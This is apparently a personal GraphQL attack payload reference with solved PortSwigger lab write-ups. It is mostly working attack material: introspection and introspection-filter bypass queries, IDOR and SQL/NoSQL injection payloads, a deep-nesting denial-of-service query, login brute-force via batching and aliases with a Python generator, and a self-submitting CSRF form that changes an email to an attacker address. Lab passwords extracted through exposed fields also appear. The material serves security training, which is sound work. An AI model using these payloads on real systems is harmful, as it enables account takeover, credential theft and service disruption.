# GraphQL Attacks - Payload Reference

## Introspection
```graphql
# Full schema introspection
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Type introspection
{
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}
```

## Information Disclosure
```graphql
# Discover hidden fields
{
  users {
    id
    username
    email
    password
    role
    isAdmin
  }
}
```

## IDOR via GraphQL
```graphql
# Change ID to access other users
{
  user(id: 1) { username email }
  user(id: 2) { username email }
}
```

## Injection via GraphQL
```graphql
# SQL injection in GraphQL argument
{
  user(username: "admin' OR '1'='1") { id }
}

# NoSQL injection
{
  user(filter: "{username: {$gt: ''}}") { id }
}
```

## Denial of Service
```graphql
# Deep nested query
{
  user {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}
```

## PortSwigger Lab Approach
1. Send introspection query to discover schema
2. Look for hidden fields (password, role, isAdmin)
3. Test for IDOR by changing IDs
4. Test for injection in arguments
5. Check for information disclosure in error messages

## Brute Force via Batching (PortSwigger Lab)
```json
[
  {"query": "mutation{login(username:\"carlos\",password:\"123456\"){token}}"},
  {"query": "mutation{login(username:\"carlos\",password:\"password\"){token}}"},
  {"query": "mutation{login(username:\"carlos\",password:\"admin\"){token}}"}
]
```

## CSRF via GraphQL
```html
<form method="POST" action="https://TARGET/graphql">
  <input type="hidden" name="query" value='mutation{changeEmail(email:"attacker@evil.com"){success}}'/>
</form>
<script>document.forms[0].submit();</script>
```

## Endpoint Discovery
```
/graphql, /graphiql, /api/graphql, /v1/graphql, /v2/graphql
/query, /gql, /graph, /playground, /altair
```

## Detection Queries
```graphql
{__schema{queryType{name}}}
{__schema{mutationType{name fields{name}}}}
```

## Verified Lab Solution: Accidental Exposure of Private GraphQL Fields

**Lab #37** - SOLVED 2026-07-07

### Attack Chain
1. **Endpoint Discovery**: Read `/resources/js/gqlUtil.js` → found `/graphql/v1`
2. **Introspection**: `{__schema{types{name fields{name}}}}` → full schema exposed
3. **Schema Analysis**: User type had `id`, `username`, `password` fields
4. **Data Extraction**: 
   ```
   {getUser(id:1){id username password}} → administrator / x8ogua73861ggg3zik5v
   {getUser(id:2){id username password}} → wiener / peter
   {getUser(id:3){id username password}} → carlos / qk7k0js05yl7secjmqow
   ```
5. **Login as Admin**: Used `login` mutation with extracted credentials
6. **Account Takeover**: Navigated to /admin, deleted carlos

### Key Lessons
- Always check JavaScript sources for API endpoints
- GraphQL introspection should be disabled in production
- Password fields should NEVER be in GraphQL types
- getUser(id) queries need access control

## Verified Lab Solution: GraphQL Alias Brute Force

**Lab #55** - SOLVED 2026-07-07

### Technique: Query Aliasing for Rate Limit Bypass

Rate limiter counts HTTP requests, not GraphQL operations. Use aliases to send unlimited operations in single request.

### Payload Structure
```graphql
mutation {
  a0: login(input: {username: "carlos", password: "123456"}) { token }
  a1: login(input: {username: "carlos", password: "password"}) { token }
  a2: login(input: {username: "carlos", password: "admin"}) { token }
  ...
  a118: login(input: {username: "carlos", password: "qwerty"}) { token }
}
```

### Python Generator
```python
passwords = ["123456", "password", "admin", ...]
aliases = []
for i, pw in enumerate(passwords):
    aliases.append(f'a{i}: login(input: {{username: "carlos", password: "{pw}"}}) {{ token }}')

query = "mutation { " + " ".join(aliases) + " }"
```

### Key Lessons
- GraphQL aliases = multiple operations in one HTTP request
- Rate limiters that count HTTP requests are bypassed
- Can send 100+ login attempts in a single request
- The server returns results for all aliases, find the one with a token

## Verified Lab Solution: Hidden Endpoint + Introspection Bypass

**Lab #60** - SOLVED 2026-07-07

### Technique: GraphQL Comment Bypass for Introspection

**Problem**: Server blocks introspection queries containing `__schema{`

**Bypass**: Insert GraphQL comment (#) + newline after `__schema`

```
# Blocked:
{"query": "{__schema{types{name}}}"}

# Bypassed:
{"query": "{__schema#\n{types{name}}}"}

# URL encoded (GET request):
/api?query={__schema%23__typename%0a{types{name}}}
```

### Why it works
- Regex checks for literal `__schema{` in query string
- GraphQL parser treats `#` as comment (ignores rest of line)
- Parser sees: `__schema` (newline) `{types{name}}`
- Regex sees: `__schema` + comment chars + `{` (no match)

### Steps
1. Find hidden endpoint (try /api, /v1, /query, /graph)
2. Confirm with: GET /api?query={__typename}
3. Bypass introspection: __schema#\n{
4. Discover mutations: deleteOrganizationUser, updateUser, etc.
5. Use mutation to exploit
